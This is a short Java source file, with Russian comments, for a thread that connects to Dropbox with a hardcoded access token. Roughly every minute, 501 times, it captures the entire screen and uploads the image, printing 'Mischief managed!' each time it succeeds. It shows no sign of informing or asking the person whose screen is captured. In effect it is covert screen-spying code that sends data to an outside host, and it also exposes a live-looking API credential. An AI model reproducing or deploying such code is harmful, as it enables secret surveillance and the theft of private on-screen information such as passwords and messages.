import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread extends Thread {

    DbxClientV2 client;

    public MyThread() throws DbxException, IOException {
        //подключение к dropbox
        String ACCESS_TOKEN = "XnbWEITOe4AAAAAAAAAEPqRz0-bYGsK3gdWLXWFJ5FCWKIyUR6GEr2MRHjKaY6tJ"; // токен проекта с dropbox
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        client = new DbxClientV2(config, ACCESS_TOKEN);
    }

    @Override
    public void run() {
        for (int i = 0; i <= 500; i++) {
            try {
                DateFormat format = new SimpleDateFormat("yyyy.MM.dd_HH:mm"); //дата снимка экрана
                String date = format.format((new Date()));

                BufferedImage screen = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                ImageIO.write(screen, "png", outputStream);
                ByteArrayInputStream in = new ByteArrayInputStream(outputStream.toByteArray());
                FileMetadata metadata = client.files()
                        .uploadBuilder("/" + date + ".png")
                        .uploadAndFinish(in);

                System.out.println("Шалость удалась!");
            } catch (AWTException | IOException | DbxException e) {
                e.printStackTrace();
            }
            try {
                Thread.sleep(61000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }
    }
}